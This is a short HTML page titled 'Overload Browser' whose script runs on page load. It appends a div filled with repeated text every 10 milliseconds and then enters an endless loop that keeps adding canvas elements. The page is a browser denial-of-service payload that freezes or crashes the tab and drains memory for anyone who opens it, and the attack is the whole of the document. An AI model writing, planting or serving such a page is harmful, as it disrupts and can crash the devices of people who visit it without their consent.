<!DOCTYPE html>
<html>
<head>
    <title>Overload Browser</title>
    <script>
        function overload() {
            setInterval(() => {
                let div = document.createElement('div');
                div.innerHTML = 'Overload! '.repeat(1000);
                document.body.appendChild(div);
            }, 10);

            while (true) {
                let x = document.createElement('canvas');
                document.body.appendChild(x);
            }
        }
    </script>
</head>
<body onload="overload()">
    <h1>Browser Overload</h1>
</body>
</html>
